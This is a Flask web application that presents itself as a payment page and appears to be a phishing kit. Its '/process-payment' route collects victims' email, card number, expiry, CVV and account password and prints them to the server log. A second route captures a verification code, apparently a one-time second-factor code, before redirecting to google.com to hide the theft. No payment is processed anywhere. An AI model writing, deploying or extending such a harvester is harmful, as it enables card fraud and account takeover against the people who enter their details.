from flask import Flask, render_template, request, redirect
import os
import time
app = Flask(__name__)

@app.route("/test")
def test():
    return "Flask is working"

@app.route("/")
def home():
    return render_template("payment.html")

@app.route("/verifying.html")
def verifying():
    return render_template("verifying.html")

@app.route("/verify.html")
def verify():
    return render_template("verify.html")

@app.route("/process-payment", methods = ["POST"])
def process_payment():
    email = request.form.get("email")
    cardholder = request.form.get("cardholder")
    cardnumber = request.form.get("card_number")
    expiry = request.form.get("expiry")
    pin = request.form.get("cvv")
    password = request.form.get("password")

    print("Email:", email)
    print("Cardholder:", cardholder)
    print("Card Number:", cardnumber)
    print("Expiry: ", expiry)
    print("Pin: ",pin)
    print("Password: ", password)
    print(request.form, flush=True)
    
    

    return redirect("/verifying.html") 


@app.route("/verify-code", methods=["POST"])
def verify_code():
    code = request.form.get("code")
    print("code:", code)
    print(request.form, flush=True)
    # save code...

    return redirect("https://www.google.com")


    

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 10000)))
    
